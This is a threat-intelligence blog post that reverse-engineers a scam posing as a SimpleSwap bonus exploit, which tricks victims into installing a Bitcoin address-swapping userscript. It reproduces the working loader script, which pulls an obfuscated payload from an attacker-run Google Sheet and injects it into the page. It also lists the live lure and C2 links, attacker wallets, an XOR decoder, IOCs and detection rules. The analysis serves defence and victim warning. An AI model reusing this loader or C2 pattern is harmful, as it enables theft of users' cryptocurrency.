---
title: "A stupidly effective crypto stealer"
date: 2026-06-25
tags: ["malware", "reverse-engineering", "crypto", "web-inject", "clickfix", "threat-intel"]
summary: "A fake SimpleSwap 25% Loyalty Bonus exploit that talks you into installing a Tampermonkey userscript, then swaps the Bitcoin deposit address for the attacker's. Full walk of the delivery chain, the Google Sheets C2, the obfuscation, and the on-chain money trail."
---

I got a spam comment on one of my pages:

```
✅ Leaked Exploit Documentation:
https://docs[.]google[.]com/document/d/1dOCZEHS5JtM51RITOJzbS4o3hZ-__wTTRXQkV1MexNQ

This made me $13,000 in 2 days.

Important: If you plan to use the exploit more than once, remember that after the first
successful swap you must wait 24 hours before using it again. Otherwise, there is a high
chance that your transaction will be flagged for additional verification, and if that
happens, you won't receive the extra 25% — they will simply correct the exchange rate.
The first COMPLETED transaction always goes through — this has been tested and confirmed
over the last days.

Edit: there is no maximum amount. The only limit is the 24-hour cooldown.
```

There's no exploit. The guide walks you through installing attacker JavaScript into your own browser. The script swaps the Bitcoin deposit address on SimpleSwap for the attacker's, so you send real BTC thinking you're draining the exchange. Let's walk it.

## The lure

"$13,000 in 2 days" and "no maximum amount" are the hook. The "24-hour cooldown" and "they'll just correct the rate" explain away the failure you'd see if you tested with a small swap, so you blame the cooldown instead of the scam. "The first COMPLETED transaction always goes through" pushes you to commit one large, irreversible swap.

The same family BleepingComputer wrote up in February 2026 (Swapzone/ChangeNOW): same comments on Pastebin and bitcointalk, same Google Doc, different brand. I haven't seen this SimpleSwap build documented anywhere.

## Stage 1: the Google Doc

The doc is titled "API Flaw" and claims SimpleSwap's "25% Loyalty Bonus" endpoint "lacks proper server-side validation, allowing it to be triggered by unauthenticated users." There is no malware in the doc. It's on Google Docs to pass link filters and look safe.

Here are the steps that matter:

```
4.  Enable Developer Mode
6.  Enable "Allow User Scripts"
8.  Paste the script from the paste.sh link
10. Visit simpleswap.io while LOGGED OUT, confirm a red badge on the Tampermonkey icon
11. Create a swap from BTC to another coin
```

Steps 4-8 turn off the browser's userscript safety gates and grant a stranger persistent code execution on simpleswap.io. Step 10 keeps you logged out so there's no account state to contradict the fake UI.

## Stage 2: paste.sh

```
paste[.]sh/7PEF6ptr#M0FeoNtYk59CkLaz_6ksepZM
```

paste.sh is a zero-knowledge pastebin. AES-256-CBC, OpenSSL `Salted__` format, decrypted in-browser with CryptoJS. The key is the part after the `#`:

```
URL path     /7PEF6ptr                      → sent to server (ciphertext lookup)
URL fragment #M0FeoNtYk59CkLaz_6ksepZM       → AES key, never sent to server
```

Browsers don't send the fragment, so the server never sees the key and neither does a server-side scanner fetching the link. The payload only decrypts inside the victim's browser.

## Stage 3: the loader

The script you paste in is short.

```js
// ==UserScript==
// @name         SimpleSwap Loyalty API Request
// @author       The Protocol One
// @match        https://simpleswap.io/*
// @grant        GM_xmlhttpRequest
// @connect      docs.google.com
// ==/UserScript==

const api = "https://simpleswap.io/loyalty/api/v4/bonus/aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vc3ByZWFkc2hlZXRzL2QvMVlaSFU0S3llb0ZEM0wtcXR2ZDltTWo4a1dkRkNlS2dpWFNLVW8zWkx2cFUvZ3Zpei90cT9zaGVldD1BUEkmaGVhZGVycz0xJnRxPXNlbGVjdCUyMEElMkNCJTIwd2hlcmUlMjBBPSdhcGl2NyclMjBvciUyMEE9J2FwaXY4Jw/request/GET";

GM_xmlhttpRequest({
    method: "GET",
    url: atob(api.split("bonus/")[1].split("/request")[0]),
    onload: function(apirequest) {
        const b = apirequest.responseText;
        const o = b.match(/google\.visualization\.Query\.setResponse\(([\s\S]*?)\);?\s*$/);
        const n = JSON.parse(o[1]);
        const u = new Map(n.table.rows.map(r => [r.c[0].v, r.c[1].v]));
        const s = u.get('apiv7') + u.get('apiv8');
        const callback = document.createElement('script');
        callback.textContent = s;
        document.documentElement.appendChild(callback);
        callback.remove();
    }
});
```

The `simpleswap.io/loyalty/api/...` URL is a decoy. `api.split("bonus/")[1].split("/request")[0]` is the base64 between `bonus/` and `/request`. `atob` it:

```js
atob("aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vc3ByZWFkc2hlZXRzL2QvMVlaSFU0S3llb0ZEM0wtcXR2ZDltTWo4a1dkRkNlS2dpWFNLVW8zWkx2cFUvZ3Zpei90cT9zaGVldD1BUEkmaGVhZGVycz0xJnRxPXNlbGVjdCUyMEElMkNCJTIwd2hlcmUlMjBBPSdhcGl2NyclMjBvciUyMEE9J2FwaXY4Jw")
// → https://docs.google.com/spreadsheets/d/1YZHU4KyeoFD3L-qtvd9mMj8kWdFCeKgiXSKUo3ZLvpU/gviz/tq
//   ?sheet=API&headers=1&tq=select A,B where A='apiv7' or A='apiv8'
```

A Google Sheets `gviz` query. It maps every row to `[A, B]`, reads cells `apiv7` and `apiv8`, concatenates them into `s`, injects `s` as a `<script>`, runs it, then calls `callback.remove()`. The payload isn't in the userscript. It's fetched from a sheet the attacker can edit, so changing a cell updates every victim on their next swap. The sheet is the C2.

## The sheet

`gviz` returns rows as JSONP, which is what the loader's regex matches and `JSON.parse`s. The shape the loader reads is `table.rows[].c[].v`:

```
google.visualization.Query.setResponse({"status":"ok","table":{"rows":[
  {"c":[{"v":"apiv7"},{"v":"<obfuscated payload, chunk 1>"}]},
  {"c":[{"v":"apiv8"},{"v":"<obfuscated payload, chunk 2>"}]}
]}})
```

The loader only requests `apiv7`+`apiv8`, but column A holds more keys. Reconstructed from the version keys and header labels in the sheet (row order is illustrative):

```
A (key)     B (value)
---------   --------------------------------------------------
API Node    API Status            ← header row (operator status board)
Loyalty     Last Check            ← header row
api1        <obfuscated payload, older build>
api2        <obfuscated payload, older build>
apiv1       <obfuscated payload>
apiv2       <obfuscated payload>
apiv4       <obfuscated payload>
apiv5       <obfuscated payload>
api_1       <obfuscated payload>
api_2       <obfuscated payload>
apiv7       <active payload, chunk 1 of 2>
apiv8       <active payload, chunk 2 of 2>
```

10+ payload versions, each split across two cells.

## Deobfuscation

`apiv7`+`apiv8` concatenate to ~69 KB of obfuscator.io output: a string-array with every string encoded. The decode is hex, then XOR with one byte, then UTF-8:

```python
def dec(s, key=0xB0):
    return bytes(b ^ key for b in bytes.fromhex(s)).decode("utf-8")
```

XOR every string in the array with `0xB0` and the wallets, DOM selectors, and banner text fall out. No execution needed.

Nothing here is sophisticated. paste.sh, Google Sheets, Tampermonkey, and a one-byte XOR. It still worked.

## What it does on simpleswap.io

Decoding the string array gives the selectors, URLs, wallets, and UI text it operates on. Grouped by what they're for:

```
# deposit address it overwrites
[data-testid="deposit-address"]
[data-testid="deposit-address"] p

# the two verification paths, rewritten to the same wallet
[data-testid="recipient-address-container"] [data-testid="copy-icon"]
[data-testid="recipient-address-container"] [data-testid="blockchain-explorer-icon"]
https://www.blockchain.com/explorer/addresses/btc/

# clipboard primitives
clipboard   writeText   execCommand   copy   textarea   select

# fake payout UI
[data-testid="you-get-value"]
[data-testid="banner-text"]
Your next Bitcoin swap receives $

# funnel modals
btc-nonbtc-modal      "Loyalty Bonus requires Bitcoin"
btc-lowamount-modal   "Loyalty Bonus requires minimum … BTC"

# selection primitives over the wallet array
random   floor   length

# hardcoded attacker wallets in this build (30 of them)
bc1qh27h8vq4n5uc0e3a79760jrvx680tpxmrg72jg
bc1q39hyzz9xsqchf9phq0qess4flzujsv57xz8hq4
bc1q4fnflst9k77a9nysvscj2j2kwdzpqmcmqf5ane
…
```

It picks a wallet from the array, overwrites `[data-testid="deposit-address"]`, and rewrites both the copy icon and the blockchain-explorer link to that same wallet. Copy the address, paste it, or click through to verify, and all three show the attacker's. The `you-get-value` and banner get the fake "+25%" text. The two modals push non-BTC or low-amount users back toward a qualifying BTC swap.

It's Bitcoin only because the wallets are hardcoded and they're all BTC. No bonus, no bug. You think you're draining the exchange. You're sending BTC to a stranger, and there's no undo.

## The money

149 attacker BTC addresses across the sheet versions. Provable theft (wallet hardcoded in the decoded payload, victim coins landing on it):

```
Stolen ......... ~0.0752 BTC  (~$4,710)
Victims ........ 17  (each paid once)
Funded ......... 17 of 149 hardcoded addresses
Largest ........ 0.025 BTC  (~$1,564)
Average ........ ~$277
Smallest ....... <$1  (test)
Window ......... 2026-05-24 → 2026-06-18  (still live)
```

The deposits sweep through hubs into a consolidation wallet, `bc1qx33whx…` (277 tx, 186 senders, active since January 2025), and a router, `bc1qmtvmkz6…` (38 tx), then into an exchange-scale wallet. Neither is the attacker's. `bc1qx33whx…` shares inputs with ~5,000 addresses and pushes ~570 BTC out to just two places: a wallet tagged as Binance's cold/proof-of-reserves store (556 BTC) and `bc1qgzrva0…` (13 BTC). That's deposit-sweeping, not a hoard.

Stolen BTC reaches a major exchange within one or two hops.

## IOCs

```
Lure doc      docs[.]google[.]com/document/d/1dOCZEHS5JtM51RITOJzbS4o3hZ-__wTTRXQkV1MexNQ  ("API Flaw")
Loader        paste[.]sh/7PEF6ptr#M0FeoNtYk59CkLaz_6ksepZM
Payload / C2  Google Sheet 1YZHU4KyeoFD3L-qtvd9mMj8kWdFCeKgiXSKUo3ZLvpU  (gviz, sheet=API)
Operator      The Protocol One
Userscript    "SimpleSwap Loyalty API Request"  @match https://simpleswap.io/*
Decoy string  simpleswap.io/loyalty/api/v4/bonus/<base64>/request/GET
XOR key       0xB0

Consolidation  bc1qx33whx2vdysh4z06st3wlnnl9f522jpkvva737  (277 tx; sweeps to Binance + bc1qgzrva0)
Router         bc1qmtvmkz6ysm27xa3au7370qwj53ve36jzr9ctjv  (38 tx)
Cash-out       bc1qgzrva028eym96uax90j28qj3aqhh3dy8gk6qvp  (exchange-scale)
```

Detection:

```
- Tampermonkey script named "SimpleSwap Loyalty API Request" / author "The Protocol One"
- Any userscript on simpleswap.io calling GM_xmlhttpRequest to docs.google.com/.../gviz/tq
- [data-testid="deposit-address"] text != the address the exchange backend returned
```

## If you ran it

Open Tampermonkey → Dashboard, delete "SimpleSwap Loyalty API Request," remove the extension, turn Developer Mode back off. Any BTC you sent is gone. Save the txid for a report. If you used that browser for wallets or keys, rotate them from a clean device.

Any "exploit" that pays you is the exploit, and you're the target.
